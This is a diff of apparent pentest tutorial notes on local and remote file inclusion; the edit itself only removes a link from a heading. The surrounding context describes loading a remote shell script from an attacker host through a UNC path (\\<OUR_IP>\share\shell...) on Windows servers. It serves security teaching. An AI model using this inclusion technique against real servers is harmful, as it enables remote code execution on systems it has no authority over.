@@ -602,7 +602,7 @@ Now, you can include your script by using a UNC path (```\\<OUR_IP>\share\shell.
 
 As you can see, this attack works in including your remote script, and you do not need any non-default settings to be enabled. However, you must note that this technique is more likely to work if you were on the same network, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows Server configurations.
 
-### LFI and [File Uploads](../server_side/file_upload_attacks.md)
+### LFI and File Uploads
 
 The following are the functions that allow executing code with file inclusion:
 
